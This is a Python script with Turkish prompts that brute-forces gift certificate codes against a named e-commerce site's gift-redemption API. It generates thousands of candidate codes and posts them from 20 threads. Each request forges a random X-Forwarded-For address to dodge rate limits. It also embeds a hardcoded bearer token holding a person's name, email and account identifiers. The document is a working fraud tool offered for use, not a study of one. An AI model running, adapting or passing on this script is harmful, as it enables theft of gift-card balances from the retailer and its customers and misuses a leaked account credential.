import requests
import json
import random
import string
import threading
import queue
import time

def random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

token = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3NDU2NjgxNDksImV4cCI6MTc0NTkyNzY0OSwiaWF0IjoxNzQ1NjY4MTQ5LCJVc2VySWQiOiJiMTUyNjJjOS04NmM3LTRkYTQtYTAwOC01OGVhNzU2ZjQzMDUiLCJUaXRsZSI6IkJla2lyIEVyZGVtIiwiRmlyc3ROYW1lIjoiQmVraXIiLCJMYXN0TmFtZSI6IkVyZGVtIiwiRW1haWwiOiJkaXNpeDg1OTI4QGN1ZGNpcy5jb20iLCJJc0F1dGhlbnRpY2F0ZWQiOiJUcnVlIiwiQXBwS2V5IjoiQUY3RjJBMzctQ0M0Qi00RjFDLTg3RkQtRkYzNjQyRjY3RUNCIiwiUHJvdmlkZXIiOiJIZXBzaWJ1cmFkYSIsIlNoYXJlRGF0YVBlcm1pc3Npb24iOiJUcnVlIiwiVGVuYW50Ijoidm9kYWZvbmUiLCJKdGkiOiIwZTk5N2RjYS0xNzVkLTQxODAtYTFmOC1mOTYwOWQ2OTBjYjMiLCJwIjp7InQiOltdfX0.j1K4SvjRYPGU11UWvlCViU_Vx3f77xEn5onmK_h8IO4"  # Bearer token goes here
url = "https://obiwan-gw.hepsiburada.com/api/v1/giftcert/useGiftCert"

def make_headers():
    return {
        'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        'Accept': "application/json, text/plain, */*",
        'Accept-Language': "tr-TR,tr;q=0.9",
        'Authorization': token,
        'Origin': "https://checkout.hepsiburada.com",
        'Sec-Fetch-Mode': "cors",
        'Sec-Fetch-Dest': "empty",
        'Referer': "https://checkout.hepsiburada.com/",
        'Sec-Fetch-Site': "same-site",
        'Content-Type': "application/json;charset=utf-8",
        'X-Forwarded-For': random_ip()
    }

# Ask user for the 4 characters to use in place of XXXX
user_code = input("Lütfen 4 karakterlik kodu giriniz: ")
if len(user_code) != 4:
    print("Hata: Tam olarak 4 karakter girmelisiniz.")
    exit()

# Create queue for codes to try
q = queue.Queue()

# Add gift codes to the queue
for i in range(100):
    for j in range(100):
        q.put(f"HB{i:02d}{user_code}{j:02d}")

def worker():
    while not q.empty():
        code = q.get()
        payload = {"code": code}
        try:
            headers = make_headers()
            response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=2)
            if response.status_code == 200:
                print(f"\n\033[92m[+] {code} -> {response.text}\033[0m")
            else:
                print(f"\033[91m[-] {code}\033[0m", end=" ", flush=True)
        except Exception as e:
            print(f"\n\033[91m[!] {code} -> Hata: {e}\033[0m")
        q.task_done()

# Start threads
threads = []
thread_count = 20  # Number of threads to use

for _ in range(thread_count):
    t = threading.Thread(target=worker)
    t.start()
    threads.append(t)

# Wait for all threads to complete
for t in threads:
    t.join()

print("\nİşlem tamamlandı.")
